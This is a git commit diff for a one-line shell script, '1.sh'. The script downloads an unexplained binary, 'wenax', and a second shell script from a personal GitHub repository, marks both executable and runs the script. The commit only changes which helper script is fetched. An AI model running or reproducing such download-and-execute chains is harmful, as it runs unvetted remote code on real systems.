5e6d27d2d223dfcc26cf86ae2b5b3fe2ea707287
irfanieka <65238670+irfanieka@users.noreply.github.com>
2024-01-17 09:48:35 +0700

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,1 +1,1 @@
-wget https://github.com/irfanieka/pynir/raw/main/wenax && chmod +x wenax && wget https://raw.githubusercontent.com/irfanieka/pynir/main/kntol.sh && chmod +x kntol.sh && ./kntol.sh
+wget https://github.com/irfanieka/pynir/raw/main/wenax && chmod +x wenax && wget https://raw.githubusercontent.com/irfanieka/pynir/main/ss.sh && chmod +x ss.sh && ./ss.sh
